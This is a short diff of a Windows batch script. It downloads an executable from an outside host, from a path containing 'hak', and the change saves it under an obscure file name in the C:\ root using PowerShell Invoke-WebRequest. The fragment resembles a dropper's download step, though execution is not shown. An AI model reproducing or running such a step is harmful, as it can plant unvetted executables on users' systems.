@@ -5,7 +5,7 @@ REM Define the URL of the file to download
 SET "url=http://thejohnsons.net.nz/source/hak/testrecro.exe"
 
 REM Define the name of the file to save
-SET "output=testrecro.exe"
+SET "output=C:\thatscrazytestrecrocalc4853.v32.exe"
 
 REM Use PowerShell to download the file
 powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"
